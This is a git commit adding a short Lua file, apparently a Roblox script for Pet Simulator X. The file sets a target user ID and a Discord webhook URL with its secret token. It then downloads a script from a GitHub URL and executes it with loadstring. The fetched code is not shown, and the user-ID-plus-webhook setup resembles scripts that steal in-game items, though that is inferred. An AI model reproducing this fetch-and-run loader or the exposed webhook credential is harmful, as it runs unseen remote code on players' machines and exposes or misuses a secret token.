6f02fa176788be2238200c921d035f02b6286750
Rafacarsari <133911366+Rafacarsari@users.noreply.github.com>
2023-05-17 12:39:29 -0700

    psx.lua

---
+++ psx.lua
@@ -0,0 +1,5 @@
+_G.UserId = 4499812422
+
+_G.Webhook = "https://discord.com/api/webhooks/1108478223945302076/ugPxaKoaDOf2tncaC-ZmFER2YQVkNoGce7M-4Mw6dYCb7GczAeDYcuVPIBF8QmDCDKtF"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
